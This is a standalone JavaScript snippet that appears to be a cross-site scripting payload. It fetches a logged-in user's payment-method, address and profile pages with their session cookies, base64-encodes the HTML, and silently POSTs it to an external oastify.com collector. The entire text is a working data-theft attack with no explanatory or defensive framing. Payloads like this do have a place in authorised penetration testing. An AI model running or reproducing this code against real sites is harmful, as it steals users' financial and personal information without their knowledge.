(async () => {
  const exfilEndpoint = "https://bbqg5x5kpurpk1eh2dhr1tl5iwonce42t.oastify.com/collector";
  const targets = [
    "/Pages/Subscriptions/ProfileManagement.aspx?view=PaymentMethods",
    "/Pages/Subscriptions/ProfileManagement.aspx?view=Address",
    "/user/userinfo/"
  ];

  for (const path of targets) {
    try {
      const res = await fetch(path, { credentials: "include" });
      const html = await res.text();

      await fetch(exfilEndpoint, {
        method: "POST",
        mode: "no-cors",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          url: location.origin + path,
          content: btoa(html)
        })
      });
    } catch (err) {
      // fail silently
    }
  }
})();
